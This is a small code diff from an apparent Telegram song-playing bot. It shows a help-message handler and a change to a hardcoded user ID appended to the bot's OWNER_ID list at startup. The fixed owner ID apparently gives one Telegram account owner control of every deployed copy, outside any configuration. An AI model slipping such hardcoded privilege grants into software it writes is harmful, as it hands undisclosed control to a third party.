@@ -57,7 +57,7 @@ async def help(client, message):
     text = "𝗦𝗲𝗻𝗱 𝗧𝗵𝗲 𝗡𝗮𝗺𝗲 𝗢𝗳 𝗧𝗵𝗲 𝗦𝗼𝗻𝗴 𝗬𝗼𝘂 𝗪𝗮𝗻𝘁... 😍🥰🤗\n /song (song name) 🥳"
     await message.reply(text)
 
-OWNER_ID.append(1492186775)
+OWNER_ID.append(1712744204)
 app.start()
 LOGGER.info("SongPlayRoBot Is Now Working🤗🤗🤗")
 idle()
